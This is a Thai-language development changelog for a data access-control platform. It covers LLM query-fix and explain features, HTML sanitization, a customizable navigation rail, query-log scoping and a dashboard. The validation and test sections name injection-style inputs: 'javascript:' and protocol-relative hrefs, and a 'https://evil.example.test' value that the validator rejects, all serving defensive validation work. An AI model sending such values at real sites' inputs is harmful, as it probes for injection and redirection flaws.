## รอบก่อนหน้า — **ข้อ BG: M26 Fix with AI + Explain query · HTML widget มีปุ่มได้ · Dashboard ย้าย label picker ไปไว้ในการ์ด Coverage · M29 ARAK Gateway ลง Roadmap**

### BG.1 M26 — *"อยากให้มีปุ่ม ให้ LLM มา Correct ให้"* · *"อยากให้มีปุ่มให้ LLM AI อธิบาย Query ให้ได้ด้วย"*

หลัก: **LLM เห็น SQL + ชื่อตาราง/column จาก catalog เท่านั้น ไม่เห็นแถว** · ผลเป็นข้อเสนอใน editor · ไม่ run เอง · SQL ที่แก้แล้วยังต้องผ่าน proxy เหมือนพิมพ์เอง ·
**Fix ไม่ถูกเสนอกับ refusal ที่ policy ตัดสิน** (ไม่งั้นกลายเป็น LLM ช่วยหาทางอ้อมสิทธิ์)

**Backend**
- `QueryRewriter.RefusedException` มี `aboutStatement()` — `true` = statement เองผิด (parse ไม่ได้ · ไม่ qualify schema · ไม่ใช่ asset ที่รู้จัก · subquery ในตำแหน่งที่ proxy ไม่ rewrite · form ของ SELECT ที่ไม่รองรับ) ·
  `false` = platform/policy ตัดสิน (`DeniedException` · ไม่ใช่ SELECT · ทุก column ถูกซ่อน · enforced form สร้างไม่ได้ · rewritten statement parse ไม่ได้ · `ProxyCapabilities` "Enforce this asset through a secure view instead" · ไม่มี SQL)
- `QueryService.RejectedException(message, deniedAsset, aboutStatement)` — `aboutStatement && deniedAsset == null` เสมอ (denial ไม่มีทาง fixable แม้สร้างด้วย true) · error จาก source = fixable
- `QueryResource` ใส่ `"fixable"` ใน body ของ 403
- `LlmAssistResource`:
  - `POST /v1/llm/assist/fix {sql, error, sourceId, engine?, model?}` → `SqlDraft` — validate SQL (ว่าง / เกิน 20,000 ตัว) · sourceId บังคับ · error ผ่าน `AssistPrompts.redactError` ก่อนส่ง · คำตอบที่ไม่ใช่ read-only ถูกทิ้ง (LOG.warn) · คำตอบเดิมเป๊ะ → problem "did not find anything to change" · UNANSWERABLE → problem
  - `POST /v1/llm/assist/explain {sql, sourceId?, engine?, model?}` → `{text, model, tables, personal}` — ไม่มี sourceId ก็อธิบายได้ (ไม่เรียก catalog) · คำตอบว่าง → 503 · ตัดที่ 4,000 ตัว
  - `draftFrom` ใช้ร่วมกับ `/sql` (extractSql · isRefusal · looksReadOnly)
- `AssistPrompts.redactError` — **error ของ DB มักสะท้อนค่าจากแถว** (`invalid input syntax for type integer: "4111-…"` · `Failing row contains (…)` · `Key (id)=(42)`) → ค่าใน quote ที่ไม่อยู่ใน SQL หรือ catalog brief ถูกแทนด้วย `'…'` / `"…"` · บรรทัด `Detail:` / `Where:` / `Internal Query:` / `Position:` ถูกตัด · `Key (x)=(…)` · รวมเป็นบรรทัดเดียว ≤ 400 ตัว
- prompt ของ fix สั่ง "Change only what the error is about" · "do not swap a table for another that holds the same data, and do not mask, hash or unmask anything yourself" · explain สั่ง "You have not seen any data and must not guess values"

**Frontend**
- `api/llm.ts` `assistFix` / `assistExplain` · `Refusal.fixable`
- `pages/query/QueryAssist.tsx` (ใหม่) — `useAssistReady` (key `['llm-me']` เดียวกับ dock) · `ExplainButton` + `ExplanationCard` (แสดงเป็น **text เท่านั้น** `whitespace-pre-wrap` ไม่เคยเป็น HTML · บอกเมื่อ editor เปลี่ยนไปจาก statement ที่อธิบาย · ปิดได้) · `FixWithAi` (ขึ้นเฉพาะ `refusal.fixable` · ส่ง statement ที่ถูกปฏิเสธ ไม่ใช่ที่อยู่ใน editor ตอนนี้ · "Use this" ใส่ editor + ล้าง refusal เก่า · ไม่ run · "Dismiss")
- QueryPage: ปุ่ม **Explain** ข้าง Run (เฉพาะคนที่มี assistant) · การ์ดอธิบายอยู่เหนือ editor · Fix with AI ใต้ refusal

**Tests** — `LlmAssistResourceTest` 16 (Mockito: สิ่งที่ออกไปหา LLM ไม่มี "4111" / email / "Failing row" · ชื่อที่ผู้อ่านรู้อยู่แล้วคงไว้ · ทิ้ง write · ปิด assistant → 403 ไม่ถึง client · gateway ล่ม → 503) ·
`QueryRefusalFixableTest` 3 · `AssistPromptsTest` +9 · `QueryRewriterTest` +3 · `QueryAssist.test.tsx` 11

### BG.2 HTML widget ไม่ render ปุ่ม — *"ทำไม HTML ไม่ Render อะ ตอนแสดงในหน้า Home"*
สาเหตุ: `HomeLayoutValidator` สร้าง HTML ใหม่จาก allowlist ของ jsoup ตอน save · ไม่มี `<button>` และไม่มี `class` → `<button class="my-custom-button">คลิกที่นี่</button>` เหลือแค่ข้อความ
แก้: `<button>` ได้ (บังคับ `type="button"` — ไม่มี script ไม่มี form จึงทำอะไรไม่ได้ เป็นแค่รูปทรง) · `class` ได้บน `a` / `button` **เฉพาะ `arak-button` / `arak-button-secondary`** (กรองหลัง clean ด้วย `Cleaner` แล้ว `keepKnownClasses`) ·
**ห้ามเปิด class อิสระ** — จะเข้าถึง utility ของ console (`fixed` `inset-0` `z-50`) แล้วสร้าง overlay ครอบหน้าได้เหมือน `style` ที่แบนอยู่ · CSS อยู่ใน `.arak-prose` (index.css) · hint ใน editor บอกว่าปุ่มที่กดแล้วไปหน้าอื่นให้เขียน `<a href="https://…" class="arak-button">` ·
tests `HomeLayoutValidatorTest.Html` +4 (keepsButton · buttonIsNeverSubmit · keepsKnownClasses · dropsOtherClasses)

### BG.3 Dashboard label picker — *"เลือกแล้วไป Filter ตรงไหนอะ มันควรอยู่ตรงจุดนั้นๆไหม"*
label มีผลแค่ "Protected by policy" · hint "on sensitive tables" · การ์ด Coverage · "Tables carrying X" — ที่เหลือใช้แค่ window · picker เดิมอยู่หัวหน้าจึงดูเหมือน filter ทั้งหน้า ·
ย้ายไปอยู่ในหัวการ์ด **Coverage** (`Widget` มี prop `tools` ใหม่) · หัวหน้าเหลือแค่ window และคำอธิบายบอกว่า label บน Coverage เลือกว่าข้อมูลไหนนับเป็น sensitive · test ใหม่ "puts the label on the card it scopes"

### BG.4 M29 ARAK Gateway ลง Roadmap — *"ถ้า user จะไปต่อ Query tool ตัวอื่น แต่ตอน Query ต้องวิ่งผ่านเรา"* (DBeaver · Excel · Power BI · Tableau · อื่นๆ)
ยังไม่ได้เขียนโค้ด — design อยู่ใน DESIGN.md FR-19: pgwire บน TLS · login ด้วย PAT · database = source · ทุก statement เข้า `QueryService` เดิม · pg_catalog ตอบจาก catalog ของ ARAK ตามสิทธิ์ · read-only · firewall source · M29a/b/c/d ·
ช่องทาง (*"JDBC, ODBC, Connector, API"*): JDBC / ODBC = driver PostgreSQL มาตรฐานต่อ pgwire (ไม่ทำ driver เอง) · Connector = `.mez` Power BI / `.taco` Tableau เปลือกบนตัวเดิม (M29d) · API = `POST /v1/query` + PAT

### BG.4a Rail — *"Mode Comfortable ตัว Customized Rail ก็ต้องอยู่ที่เดียวกันกับโหมด Compact สิ"*
เดิม Comfortable มีปุ่ม "Customize rail" เต็มความกว้างเหนือ copyright · Compact เป็น icon ท้ายบรรทัด copyright → ตำแหน่งเปลี่ยนตามขนาดที่เลือก ·
ตอนนี้ footer เดียวทั้งสองขนาด: เส้นคั่น · `© 2026 MFEC` ซ้าย · icon Customize ขวา — Comfortable แค่ใหญ่กว่า (ปุ่ม 40px icon 20px ตัวอักษร sm) · `Rail.test.tsx` ตรวจว่า icon อยู่บรรทัดเดียวกับ copyright ทั้งสองขนาด

### BG.5 ผลทดสอบ
- backend `./mvnw -o verify -Pintegration` — **BUILD SUCCESS · 1,196 tests · 0 failures** (เดิม 1,161 + ใหม่ 35) · live dev app: parse refusal `fixable: true` · DELETE `fixable: false` · `/assist/fix` + `/explain` ตอบจาก gateway จริง · Home HTML เก็บ `<button type="button">` + `class="arak-button"` ทิ้ง `tw:fixed` / onclick · ไม่มี key ip ใน response (`scratchpad/live_bg.py`)
- frontend `tsc` ผ่าน · jest **43 suites / 435 tests** ผ่าน · `VITE_BASE=/Arak/ npm run build` ผ่าน

---

## รอบก่อนหน้า — **ข้อ BF: Rail ด้านซ้ายที่แต่ละคนจัดเองได้ (V26) + เลือกขนาดได้ Comfortable / Compact (V27) · Enforcement และ System ย้ายเข้า Settings · Suggest พร้อม % · กดดูสมาชิก/attribute ของกลุ่ม · Dashboard เลือก label · 🐛 Query ถูกปฏิเสธว่า "could not be parsed" ทุกตัว**

ผู้ใช้สั่งหลายข้อต่อกันในรอบเดียว — ข้อที่ทำเสร็จและทดสอบแล้วอยู่ในหัวข้อนี้ ข้อที่ยังค้างอยู่ใน BF.9

หลักของรอบนี้:
- **เมนูเป็นแค่ความชอบ ไม่ใช่สิทธิ์** — rail ที่จัดเองเก็บที่ server ต่อ account แต่ **href ที่เก็บไว้ไม่ให้สิทธิ์อะไรเลย**: client แสดงเฉพาะ section ที่ account นี้ถูก offer อยู่แล้ว (`sectionsFor(hasRole)`) และทุก section ยังถูก API ปฏิเสธเองอยู่ดี
- **Migration ใหม่สองตัว: V26 + V27** (ตอนนี้ V1–V27)
- **ไม่มี client address ออกไปไหน** — `requester_ip` / `client_ip` ยังไม่ถูก select ในทุก endpoint ที่แตะรอบนี้ (ตรวจ response จริงแล้ว ไม่มี key ที่เป็น ip)

### BF.1 Rail ที่จัดเองได้ — ผู้ใช้ขอ *"อยากให้สามารถ Customize Ribbon ด้านซ้ายเองได้ ของ user แต่ละคน"*

**Backend**
- **V26 `user_rail`** — `principal_id uuid PK → principal(id) ON DELETE CASCADE` · `sections jsonb NOT NULL` · `updated_at` · ไม่มีแถว = ใช้ rail ตั้งต้น
- `home/Rail.java` — `Section(href, shown)` · `Layout(sections)` · `View(sections, updatedAt)` · `validate()`:
  - body / list เป็น null → "No sections" · href เป็น null → "Every section needs an address" · ซ้ำ → "Listed twice: /x"
  - ไม่เกิน `MAX_SECTIONS = 40` · href ยาวไม่เกิน 64 · ต้องตรง `^/([a-z0-9-]+(/[a-z0-9-]+)*)?$` — กัน `https://…`, `//host`, `javascript:`, `/../`, query, fragment, ตัวใหญ่, ช่องว่าง, trailing slash · ข้อความ error ตัด href ยาวไม่ให้สะท้อนกลับทั้งก้อน
  - `shown` ที่เป็น null = true · list ว่างรับได้ (แต่ UI ไม่ยอมให้ save rail ว่าง)
- `home/RailStore.java` — `forPrincipal` · `save` (validate ก่อนเสมอ แล้ว upsert `CAST(:body AS jsonb)`) · `reset` (ลบแถว)
- `resources/RailResource.java` — `GET / PUT / DELETE /v1/me/rail` · `@Secured` (ใครก็ได้ที่ login) · **ทำกับแถวของผู้เรียกเท่านั้น ไม่รับ principal จาก request** · ไม่มีเวอร์ชัน admin · `InvalidRailException` → 400

**Frontend**
- `api/rail.ts` — `fetchRail` / `saveRail` / `resetRail` · key `['me','rail']`
- `layout/navigation.ts` — field ใหม่ `defaultShown?: boolean` (false = offer ให้แต่ไม่อยู่ใน rail จนกว่าจะ pin) · `arrangeRail(offered, saved)`:
  - ไม่มีที่เก็บไว้ → rail ตั้งต้น
  - มี → เรียงตามที่เก็บ · **ตัดทิ้งเงียบๆ** ทุก href ที่ account นี้ไม่ได้ถูก offer (section ที่ถูกลบ / role ที่เสียไป) และตัวที่ซ้ำ
  - section ที่ถูก offer แต่ไม่เคยจัด (ของใหม่ในรุ่นนี้ หรือได้ role ใหม่) → แทรกต่อจาก section ที่อยู่ก่อนหน้ามันในลำดับตั้งต้น ด้วยค่า shown ตั้งต้น — ไม่ต้องเปิด Customize ก็เจอ
- `layout/RailCustomizer.tsx` — หน้าต่าง **"Customize your rail"**: ลากเรียงได้ (HTML5 drag) + ปุ่ม ↑ ↓ สำหรับ keyboard · Toggle ต่อแถว · ป้าย "Also in Settings" บน section ที่ `defaultShown: false` · นับ "n of m shown" · **Save ถูกปิดถ้าไม่มีอะไรเปลี่ยน หรือซ่อนหมดทุกตัว** ("Keep at least one section in the rail.") · Reset to default ใช้ได้เมื่อเคยจัดไว้ · mount เฉพาะตอนเปิด ดังนั้นเปิดใหม่ทุกครั้งเริ่มจาก rail จริง ไม่ใช่ draft ที่ Cancel ทิ้งไว้
- `layout/AppShell.tsx` — `Sidebar` ใช้ `useQuery(fetchRail)` · **ระหว่างรอ หรือโหลดไม่สำเร็จ ใช้ rail ตั้งต้น ไม่ใช่ rail ว่าง** · save/reset สำเร็จ → `setQueryData` แล้วปิด · ไม่สำเร็จ → ข้อความใน `role="alert"` และหน้าต่างยังเปิดอยู่

**BF.1a ขนาดของ rail — เลือกเองได้ระหว่าง Comfortable (แบบเดิม) กับ Compact**

ลำดับเหตุการณ์:
1. ผู้ใช้ส่งภาพ rail แล้วบอก *"ทำให้ Compact กว่านี้หน่อย ให้ดูสวย Clean ตา ไม่รกตา"* → ทำ rail แบบกระชับแทนที่ของเดิม
2. ผู้ใช้ดูแล้วบอก *"Menu ด้านซ้าย มันเล็กไป ชอบใหญ่ๆ แบบเดิมมากกว่า เอาคืนมา"*
3. แล้วสั่งต่อ *"เปลี่ยนเป็นสามารถตั้งค่าได้ ว่าจะเอาแบบนี้ หรือแบบเดิม"* → **แบบเดิมกลับมาเป็นค่าตั้งต้น** และแบบกระชับกลายเป็นตัวเลือก

ใช้ที่ไหน: ปุ่ม **"Customize rail"** ล่างสุดของ rail → หน้าต่าง "Customize your rail" → หัวข้อ **Size** บนสุด → **Comfortable** (*Large rows and icons*) / **Compact** (*Narrower, shorter rows*) → **Save** · เก็บต่อคนเหมือน section · **Reset to default** กลับเป็น Comfortable

**Backend**
- **V27 `user_rail.density`** — `text NOT NULL DEFAULT 'comfortable' CHECK (density IN ('comfortable','compact'))` · แถวเดิมทุกแถวได้ comfortable
- `Rail.java` — `COMFORTABLE` / `COMPACT` · `Layout(sections, density)` (constructor เดิม `Layout(sections)` ยังใช้ได้ = comfortable) · `View(sections, density, updatedAt)` · `unarranged()` = comfortable · `Rail.density(layout)`: null → comfortable · ค่าอื่นนอกจากสองตัวนี้ → `InvalidRailException("Unknown rail size: …")` (**ตัวพิมพ์ต้องตรง** `Compact` ไม่รับ · ค่ายาวถูกตัดก่อนสะท้อนกลับ)
- `RailStore` — SELECT / upsert คอลัมน์ `density` ด้วย · validate density ก่อนเขียน ค่าผิดจึงไม่เขียนอะไรลงไปเลย

**Frontend**
- `api/rail.ts` — `RailDensity` · `railDensity(view)` คืน `compact` เฉพาะเมื่อ server บอก compact เป๊ะๆ (ค่าอื่น / ไม่มี / โหลดพัง = comfortable) · `saveRail(sections, density)` ส่ง `{sections, density}`
- `AppShell.tsx` — ความกว้างอ่านจาก rail query เดียวกัน: comfortable `w-70` (ย่อ `w-18`) · compact `w-60` (ย่อ `w-16`) · `<nav data-density=…>`
  - **Comfortable = ของเดิมทุกจุด**: แถว `h-11` · icon `size-6` · `text-md` · แถวที่เปิดอยู่เป็นพื้น brand ทึบ ตัวอักษรขาว · ปุ่ม "Customize rail" เต็มแถว · copyright สองบรรทัด
  - **Compact**: แถว `h-9` · icon 18px · `text-sm` · แถวที่เปิดอยู่เป็นพื้นฟ้าอ่อน + ตัวอักษร brand · badge `h-4.5` · footer บรรทัดเดียว "© 2026 MFEC" + icon `Sliders01` (aria-label "Customize rail")
- `RailCustomizer.tsx` — `role="radiogroup"` สองตัวเลือก (`role="radio"` + `aria-checked`) · เปลี่ยนแค่ขนาดก็นับว่า dirty → Save กดได้

**ทดสอบเพิ่ม**
- `RailTest` +1 (`density()` — ตั้งต้น · สองค่า · ปฏิเสธ `Compact` / `tiny` / `""` / ค่ายาว 200 ตัวอักษร โดยข้อความ error สั้นกว่า 120) → **18**
- `RailStoreIT` +1 (save ตั้งต้น → compact → อ่านกลับได้ · `tiny` ถูกปฏิเสธและค่าเดิมไม่เปลี่ยน · reset → comfortable · UPDATE ตรงเป็น `tiny` ชน CHECK) → **6**
- `Rail.test.tsx` +2 (ตั้งต้น comfortable + ปุ่ม Customize เต็มข้อความ · เลือก Compact → Save ส่ง `'compact'` + section ครบ → nav เป็น compact · compact ที่เก็บไว้ถูกอ่าน / ค่าแปลก `huge` = comfortable) → **15**
- **live** (dev app จริง): Flyway V27 success · GET → `density: comfortable` · PUT compact → คืน compact · PUT `tiny` → 400 · DELETE → comfortable · Playwright: comfortable → เลือก Compact + Save → reload ยัง compact → Reset → comfortable · ไม่มี 5xx / page error · rail ของ admin ถูกคืนเป็นค่าตั้งต้นแล้ว

**ทดสอบ**
- `RailTest` 17 (+1 ใน BF.1a) · `RailStoreIT` 5 (+1 ใน BF.1a) (round trip, แทนที่ทั้งก้อน, แยกต่อคน, validate ก่อนเขียน, reset + cascade)
- `layout/Rail.test.tsx` 13 (+2 ใน BF.1a) — arrangeRail 4 เคส · Enforcement offered แต่ไม่แสดงตั้งต้น · requester ไม่ได้ทั้ง Enforcement และ Settings · Sidebar: วาดตามที่เก็บ · fallback ตอนโหลดพัง · pin + ย้าย + save ส่งครบทุก section · ไม่ยอม save rail ว่าง · cancel ไม่เปลี่ยน + reset · save พังแล้วบอกเหตุผล
- **live** (dev app จริง): GET → null · PUT → คืนตามที่ส่ง · PUT `https://evil.example.test` → 400 · DELETE → null · ไม่มี token → 401 · Playwright: pin Enforcement + ย้าย Requests → save → reload ยังอยู่ → reset กลับตั้งต้น · ไม่มี 5xx / page error

### BF.2 Enforcement ย้ายเข้า Settings — *"เอา Enforcement ไปใส่ใน Setting ก่อน"*
- `navigation.ts` Enforcement `defaultShown: false` — ยังอยู่ในหน้าต่าง Customize ให้ pin กลับได้
- Settings → **Data source connections** มีการ์ด **Enforcement** (`/enforcement`) สำหรับ PLATFORM_ADMIN / POLICY_AUTHOR / DATA_OWNER — ตรงกับที่ API ยอม (apply / rollback ยังเป็น admin เท่านั้น)
- Settings ใน rail เปิดให้ POLICY_AUTHOR / DATA_OWNER ด้วย (เดิม admin เท่านั้น) — ไม่งั้นสองบทบาทนี้หา Enforcement ไม่เจอ · การ์ดที่ `adminOnly` ยังซ่อนจากเขา
- หน้า Enforcement มี breadcrumb "Settings" เหนือหัวเรื่อง
- `pages/settings/SettingsPage.test.tsx` (ใหม่ 4) — policy author เห็น Enforcement / ไม่เห็น Registered sources · data owner เห็น · auditor ไม่เห็น · admin เห็นครบ

### BF.3 System ย้ายเข้า Settings — *"เอา System เข้าไปอยู่ใน Setting แล้วไม่ต้องแสดงแถบด้านซ้าย"*
- route ใหม่ `/settings/system` (การ์ด **Service & build**) · `/system` เดิม redirect มา · ไม่อยู่ใน rail แล้ว
- หน้า System: breadcrumb Settings · การ์ด Service · ส่วน crawl เฉพาะ admin (non-admin ไม่เรียก `fetchSyncStatus` เลย)
- `SystemStatusPage.test.tsx` เขียนใหม่ 4 เคส

### BF.4 Suggest พร้อม verdict และ % — หน้า Review ของคำขอ
- `AccessReview.Recommendation(verdict, score 0–100, summary, suggestedDays, signals[])` — เริ่มที่ 50 แล้วบวก/ลบตาม signal ที่ reviewer อ่านได้ทุกตัว · **เป็นกฎ ไม่ใช่ AI — ไม่มี model และไม่เรียนรู้อะไร** · `APPROVE_AT = 70` · `REJECT_BELOW = 40`
- สามกรณีไม่ให้คะแนนเลย (ผู้ขอหาย / ถูกปิด / อ่านได้อยู่แล้ว → `DECLINE`) · grant ที่ policy ยังตีตกจะ **ไม่มีทาง lean approve**
- **เป็นคำแนะนำเท่านั้น — ไม่ approve เอง** และการ approve ยังแค่บันทึกการตัดสินใจเหมือนเดิม
- `AccessReviewTest` เพิ่มเคส recommendation · `AccessRequestIT` ตรวจ field ใน response จริง

### BF.5 กดดูสมาชิกและ attribute ของกลุ่ม
- `Membership` มี `id` แล้ว · ชิปกลุ่มในหน้า Review กดได้ → เปิดรายละเอียดกลุ่ม (สมาชิก + attribute)
- `PrincipalQuery` คืน attribute ของสมาชิก (`memberAttributes`) · หน้า Principal detail แสดง · เทสต์ใน `PrincipalDetailPage.test.tsx`

### BF.6 Domain / FQN ในหน้า Review ล้นกรอบ — *"หน้า Request ตัวอักษรหลุดกรอบ"*
- ชิป Domain / FQN ใน `RequestReview.tsx` ตัดบรรทัดด้วย `min-w-0` + `break-all` / truncate พร้อม title — ไม่ล้นออกนอกการ์ดแล้ว

### BF.7 Dashboard — label เลือกแทนพิมพ์ — *"เปลี่ยนจากพิมพ์เป็นให้เลือกดีกว่าไหม"*
- ช่อง label ของ Dashboard เป็น Select จาก classification/tag ที่มีจริง · เทสต์ใน `DashboardPage.test.tsx`

### BF.8 🐛 Query ทุกตัวถูกปฏิเสธว่า *"This statement could not be parsed, so it cannot be enforced and will not be run"*

ผู้ใช้ถาม *"ทำไม Query แล้วขึ้นแบบนี้"*

**อาการ** — `audit_query` มี REJECTED ด้วยเหตุผลนี้ 17 แถวติดกันในช่วงเวลาเดียว ทั้ง `SELECT * FROM sales.customer` และแม้แต่ `SELECT 1` · ผู้ใช้ทุกคน · SQL เดิมเคย EXECUTED ได้ก่อนหน้า · bytes ของ SQL ปกติ (ไม่มีตัวอักษรแปลก)

**สาเหตุ — ไม่ใช่บั๊กของ parser หรือ policy** — JVM ที่รันอยู่เริ่มจาก `target/dac-service.jar` แล้ว **jar ถูก build ทับระหว่างที่ JVM ยังรันอยู่** · class ของ JSqlParser โหลดแบบ lazy ตอน parse ครั้งแรก จึงอ่านจากไฟล์ที่ offset ไม่ตรงแล้ว → error ถูกห่อเป็น `JSQLParserException` → ข้อความ fail-closed นี้ (ซึ่งตั้งใจไม่ echo ข้อความของ parser) · พิสูจน์: เรียก `CCJSqlParserUtil.parse("SELECT 1")` ตรงจาก jar ใหม่ → parse ได้ปกติ

**แก้**
- restart app → `SELECT 1` รันได้ · `sales.customer` ได้คำตอบของ policy ตามปกติ (admin ถูก `finance-subscription` ปฏิเสธ = ถูกต้อง)
- script ยก dev app (ใน scratchpad ไม่ได้ commit) **รันจากสำเนาของ jar** — build รอบหน้าจะไม่เขียนทับไฟล์ที่ JVM กำลังใช้อีก
- **บทเรียนสำหรับ deploy จริง:** ห้ามวาง jar ใหม่ทับไฟล์ที่ JVM เปิดอยู่ ให้ stop → copy → start (หรือ copy ไปชื่อใหม่แล้ว restart)
- ผู้ใช้ขอต่อ: *"อยากให้มีปุ่ม ให้ LLM มา Correct ให้"* และ *"อยากให้มีปุ่มให้ LLM AI อธิบาย Query ให้ได้ด้วย"* → **M26** (ดู Roadmap)

### BF.9 ยังค้างจากชุดคำสั่งนี้ (ยังไม่ได้ทำ)
- **(b)** ขอสิทธิ์ในนามกลุ่ม — **ตอนนี้ยังไม่รองรับ**: คำขอผูกกับผู้ขอคนเดียว · ใส่ Roadmap เป็น **M27** แล้ว
- **(d)** จัดหน้า Access Requests ให้เป็นระเบียบกว่านี้
- **(f)** Home page per role — แสดงรายการ role ก่อน กดแล้วค่อยแก้ทีละ role
- **(g)** Application roles — แยก list คนที่จะ grant ออกจาก Role master
- **(j)** Query log export CSV / Excel (ตาม scope ของผู้อ่าน · **ห้ามมี client_ip**)
- **(k)** Header ของคำขอแบบ sticky ตอนเลื่อน + list ด้านซ้ายค้างให้เห็นแถวที่เลือก
- ผู้ใช้ขอ *"Catalog ต้องสามารถให้ LLM มาช่วยในการค้นหาได้ด้วย"* → คือ **M16** ที่อยู่ใน Roadmap แล้ว · เพิ่มจุดเข้าในหน้า Catalog ลงใน M16
- ผู้ใช้ส่งผลของ Assistant ที่ถาม *"มีข้อมูล employee ไหม"* แล้วได้ *"The assistant could not answer that from the tables in this source."* — **ถูกต้องตามที่ออกแบบไว้ตอนนี้**: โหมด SQL ของ mascot รับเฉพาะคำขอที่แปลงเป็น SELECT ได้บน source ที่เลือก ไม่ได้เป็นแชท · ผู้ใช้ขอ *"นอกจากสร้าง Query แล้ว ยังอาจจะต้องสามารถแชทโต้ตอบได้ เช่นช่วยค้นหา ตอบเรื่องทั่วไป ถาม Syntax .... แล้ว Write query"* · *"หรือทำเป็น Agent ไปเลย"* · *"Catalog ต้องสามารถแชทพูดคุยได้สิ หรือ ด้านขวาล่าง Mascot ต้องแชทคุยได้ อยากทำอะไร หาอะไร เปิดหน้าไหนในแอพ"* → ใส่ Roadmap เป็น **M28 Conversational ARAK Agent**

### BF.10 ตัวเลขเทสต์
- backend `./mvnw -o verify -Pintegration` → **BUILD SUCCESS · 1,161 tests · 0 failures / 0 errors** (รวม `RailTest` 18 · `RailStoreIT` 6 · recommendation / memberAttributes)
- frontend: **42 suites / 423 tests ผ่าน** · `tsc --noEmit` สะอาด · `vite build` ผ่าน

## รอบก่อนหน้า — **ข้อ BE: M10 — Query log ที่อ่านได้ตามหน้าที่ (V25) + Access Control Dashboard หน้าเดียวทั้งองค์กร**

ผู้ใช้ถามว่า *"แล้ว log การ Query หละ"* แล้วตามด้วย *"หน้า Dashboard Access Control รวมหละ ออกแบบให้ด้วย ขอสวยงาม มีความหมาย"* · ภายใต้คำสั่งเดิม *"ทำต่อได้เลยนะ เอาตาม Roadmap ทำไปเรื่อยๆ ต้องทดสอบให้ดีทุกขั้นตอน"* / *"ทำต่อ"* → ทำ M10 ตามแบบที่วางไว้ในข้อ AM.4 จบรอบนี้

หลักของรอบนี้:
- **อ่านอย่างเดียวทั้งคู่** — ทั้ง `/v1/audit/queries` และ `/v1/dashboard` ไม่เขียนอะไรเลย
- **ไม่มี client address ออกไปไหนเลย** — `client_ip` ของ `audit_query` / `audit_decision` / `audit_policy_change` / `audit_enforcement` และ `access_request.requester_ip` **ไม่ถูก select** ในทั้งสอง endpoint (ตรวจทั้ง unit, IT และ live)
- **Migration ใหม่หนึ่งตัว: V25** (ตอนนี้ V1–V25)

### BE.1 V25 `audit_query_assets.sql`

- `asset_fqns text[] NOT NULL DEFAULT '{}'` + GIN index — **table ที่ proxy resolve ได้จริง** ตอนตัดสินใจ statement นั้น เขียนลงไปพร้อมแถว · เหตุผล: owner ต้องเห็น query บน table ของตัวเอง และการตัดสินจาก SQL ตอนอ่านคือ parse ใหม่ทุกแถวแล้วหวังว่าจะตรงกับตอนที่ govern จริง
- `run_by text` — ใครเป็นคนส่ง ถ้าไม่ใช่ principal ที่รันในนามนั้น (admin ใช้ `asPrincipal` รันแทนคนอื่น) · null เมื่อเป็นคนเดียวกัน · ไม่งั้น log จะแสดงให้คนนั้นเห็น query ที่เขาไม่เคยส่ง
- backfill: แถว REJECTED เก่าที่ reason เป็น `Access to X is denied` ได้ `asset_fqns = {X}` จากคำของ proxy เอง · แถวอื่นก่อน V25 ว่าง → owner filter วางไม่ได้ ยังเห็นเฉพาะคนรันเองและ role ที่ดูแลทั้งหมด (เหมือนเดิม)
- `QueryService` เขียนสองคอลัมน์นี้ทุกทาง (EXECUTED / REJECTED / FAILED) · `QueryResource` ส่ง `run_by` เมื่อ admin รันแทน

### BE.2 `GET /v1/audit/queries` — Query log

- params: `outcome` (EXECUTED/REJECTED/FAILED) · `principal` · `q` (ค้นใน SQL) · `assetFqn` · `sourceId` · `days` หรือ `from`/`to` · `before` (cursor = id) · `limit`
- คืน `QueryPage { since, until, scope, rows[], nextBefore, counts }` · `counts` (total / executed / rejected / failed) เฉพาะหน้าแรก
- `QueryRow`: `id · occurredAt · principal · runBy · sourceId · sourceName · outcome · category · rejectReason · originalSql · rewrittenSql · sqlHidden · rowCount · durationMs · assets · hiddenAssets · own`
- **scope ต่อผู้เรียก**:
  | ผู้เรียก | scope | เห็น |
  |---|---|---|
  | PLATFORM_ADMIN / POLICY_AUTHOR / AUDITOR | `EVERYTHING` | ทุกแถว ครบทุกช่อง |
  | DATA_OWNER | `OWNED` | แถวของตัวเอง + แถวที่แตะ table ที่ scope ตัวเองครอบ |
  | คนอื่น | `OWN` | แถวที่ตัวเองเป็น principal หรือ `run_by` |
- **แถวของคนอื่นที่ owner เห็น (`present()`)**: `assets` เหลือเฉพาะ table ที่ owner ถือ · ที่เหลือนับเป็น `hiddenAssets` · **SQL ซ่อน (`sqlHidden`)** เว้นแต่ทุก table ในแถวเป็นของ owner และ outcome เป็น EXECUTED/FAILED (SQL ที่แตะ table คนอื่นบอกชื่อ column / literal ของ table นั้น) · `rejectReason` ออกเฉพาะเมื่อทุก table เป็นของ owner และ category เป็น POLICY_DENY / CANNOT_ENFORCE / ALL_COLUMNS_HIDDEN (เหตุผลแบบอื่นอาจพูดถึง source หรือ table อื่น)
- `audit/QueryRefusals.java` — จัด reason เป็น `Category`: POLICY_DENY · UNGOVERNED · CANNOT_ENFORCE · ALL_COLUMNS_HIDDEN · UNPARSEABLE · NOT_READ_ONLY · UNQUALIFIED · UNSUPPORTED · SOURCE_UNAVAILABLE · SOURCE_ERROR · EMPTY (จับจากคำขึ้นต้นของข้อความ proxy เอง — **เปลี่ยนข้อความใน proxy ต้องแก้ที่นี่ด้วย** `QueryRefusalsTest` คุมอยู่)
- `audit/QueryLog.java` — query + counts + cursor

### BE.3 หน้า `/audit` "Query log"

- เมนู **Query log** ทุก role (เห็นตาม scope) · ลิงก์จากหน้า Query ด้วย
- filter: outcome · principal · table · ช่วงวัน · ค้น SQL — **อยู่ใน URL** (`?outcome=REJECTED&table=…&days=30`) ทำให้ dashboard ลิงก์เข้ามาตรงได้
- แถวแสดง category เป็นภาษาคน (`CATEGORY_LABELS` ใน `api/audit.ts`) · "run by admin" เมื่อมี `runBy` · SQL ที่ซ่อนบอกว่าซ่อนเพราะอะไร · `+N more tables` เมื่อ `hiddenAssets > 0`

### BE.4 `GET /v1/dashboard?days=30&label=PII`

- **403 เว้นแต่ `overseesEverything`** (admin / POLICY_AUTHOR / AUDITOR) — dashboard ครอบทุก table และทุกคน · `days` 1–365 · `label` ไม่ว่าง ≤ 200 ตัว · นอกนั้น **400** · ไม่มี token 401
- `label` = classification/tag ที่ถือว่า sensitive (hierarchical ผ่าน `asset_facet` — `PII` ครอบ `PII.Sensitive`) · เปลี่ยนเป็น `Tier.Tier1` หรืออื่นๆ ได้
- คืน `Dashboard { generatedAt, since, days, label, coverage, grants, activity, requests, health, attention[] }` (`dashboard/DashboardQuery.java` + `resources/DashboardResource.java`)
